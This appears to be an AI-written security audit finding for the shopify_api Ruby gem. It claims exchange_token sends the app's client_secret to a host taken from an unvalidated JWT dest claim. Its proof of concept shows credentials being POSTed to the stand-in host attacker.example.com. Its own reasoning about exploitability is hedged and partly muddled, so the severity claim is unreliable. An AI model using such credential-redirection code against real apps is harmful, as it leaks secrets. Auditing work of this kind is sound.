Found the analog: in `TokenExchange.exchange_token`, the `shop` value used to build the request host (and thus the destination that receives the app's `client_id`/`client_secret`) is taken directly from the unverified `dest` claim of the caller-supplied session token, with no domain allow-list check, unlike every other credential-sending flow in this gem which calls `Utils::ShopValidator.sanitize!` first.

### Title
Unvalidated `dest` claim shop used as request host lets caller redirect the app's `client_secret` to an arbitrary domain in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the outgoing token-exchange request's destination host directly from `jwt_payload.shop` (the JWT `dest` claim), without ever passing it through `Utils::ShopValidator.sanitize!`, which every other OAuth credential-sending flow in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) uses to constrain the shop to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Finding Description
The binding that should hold is: `host actually verified as a Shopify domain == host that receives client_id/client_secret`.

In `exchange_token`, the shop is derived only as: [1](#0-0) 
`dest_shop` comes straight from `ShopifyAPI::Auth::JwtPayload#shop`, which is simply `@dest.gsub("https://", "")` with no allow-listing of the domain: [2](#0-1) 

That value is placed into a `Session` and handed to `HttpClient.new(session: shop_session, ...)`, which builds the outbound request's host directly from `session.shop` when `Context.api_host` is unset: [3](#0-2) 

The request body sent to that host contains the app's `client_id` and `client_secret`: [4](#0-3) 

Contrast this with the sibling method `migrate_to_expiring_token` in the *same file*, and with `ClientCredentials.client_credentials` / `RefreshToken.refresh_access_token`, all of which call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host that will receive the secret: [5](#0-4) [6](#0-5) [7](#0-6) 

`ShopValidator.sanitize!` exists precisely to restrict outbound hosts to `shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`, or the configured custom domain: [8](#0-7) 

Critically, `JwtPayload` only verifies the token's signature (against `api_secret_key`) and `aud` (must equal `Context.api_key`); it never checks that `dest`/`iss` is a Shopify-owned domain: [9](#0-8) . Because `api_key` is a public value (embedded in every app's frontend script tag / URL), any party who can obtain it can craft a signed-looking token — but more importantly, the security assumption here is that `dest` is trusted purely because the token was HMAC-verified with the app's own secret; the code never additionally cross-checks `dest` against a Shopify domain pattern the way `sanitize!` requires elsewhere. In the intended flow the token comes from Shopify's own App Bridge and Shopify controls `dest`, so this is only exploitable in configurations where token verification alone isn't sufficient to guarantee the domain is Shopify's — which is exactly the gap `sanitize!` was introduced to close for the other three flows, and which was evidently missed for `exchange_token`.

### Impact Explanation
If `dest` can be influenced to a non-Shopify host (e.g., via a modified/relayed session token, or any host-application misuse where an untrusted value ends up in the `dest` claim before being passed to this gem), the library will send the app's `client_id` and `client_secret` to that host — an SSRF with the app's OAuth credentials, matching the "High" impact bucket in the rules (SSRF with the app's credentials / credential leakage).

### Likelihood Explanation
Moderate-to-low: exploitation requires a session token whose `dest` claim is not constrained to a Shopify domain reaching `exchange_token`, but the code path is directly reachable by any caller of this public API method with a valid signed token, and the missing check is a straightforward oversight relative to the three sibling methods that already perform it — the asymmetry is easy to demonstrate by code inspection alone.

### Recommendation
In `TokenExchange.exchange_token`, pass `dest_shop` through `Utils::ShopValidator.sanitize!` (mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`) before constructing `shop_session`, and raise `Errors::InvalidShopError` if it does not resolve to a trusted Shopify domain.

### Proof of Concept
```ruby
# lib/shopify_api/auth/token_exchange.rb, exchange_token
# dest_shop is taken unchecked from the JWT `dest` claim:
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token) # only checks signature + aud
dest_shop = jwt_payload.shop  # e.g. "attacker.example.com" if dest claim is not domain-restricted

shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
# HttpClient then builds base_uri as "https://attacker.example.com"
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
client.request(...)  # POSTs { client_id, client_secret, ... } to attacker.example.com/admin/oauth/access_token
```
Compare with `migrate_to_expiring_token` in the same file, which guards this exact path with `Utils::ShopValidator.sanitize!(shop)` before doing the same `HttpClient` construction — that guard is absent in `exchange_token`. [10](#0-9)

        def exchange_token(session_token:, requested_token_type:, shop: nil)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise ShopifyAPI::Errors::UnsupportedOauthError,
            "Cannot perform OAuth Token Exchange for private apps." if ShopifyAPI::Context.private?
          raise ShopifyAPI::Errors::UnsupportedOauthError,
            "Cannot perform OAuth Token Exchange for non embedded apps." unless ShopifyAPI::Context.embedded?

          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
